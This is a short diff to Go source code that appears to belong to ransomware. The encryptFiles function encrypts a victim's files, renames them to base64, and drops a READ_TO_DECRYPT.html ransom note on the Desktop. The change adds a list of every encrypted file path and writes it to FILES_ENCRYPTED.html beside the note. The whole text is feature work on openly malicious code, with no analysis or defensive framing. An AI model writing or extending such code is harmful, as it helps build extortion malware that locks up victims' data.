@@ -211,6 +211,9 @@ func encryptFiles() {
 	// Wait for all goroutines to finish
 	cmd.Indexer.Wait()
 
+	// List of files encrypted
+	var listFilesEncrypted []string
+
 	// Rename the files after all have been encrypted
 	for _, file := range FilesToRename.Files {
 		// Replace the file name by the base64 equivalent
@@ -222,6 +225,9 @@ func encryptFiles() {
 			cmd.Logger.Println(err)
 			continue
 		}
+
+		// Append the current filepath on the encrypted list
+		listFilesEncrypted = append(listFilesEncrypted, file.Path)
 	}
 
 	message := `
@@ -244,6 +250,9 @@ func encryptFiles() {
 
 	// Write the READ_TO_DECRYPT on Desktop
 	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
+
+	// Write a list with all files encrypted
+	ioutil.WriteFile(cmd.UserDir+"Desktop\\FILES_ENCRYPTED.html", []byte(strings.Join(listFilesEncrypted, "\n")), 0600)
 
 	cmd.Logger.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
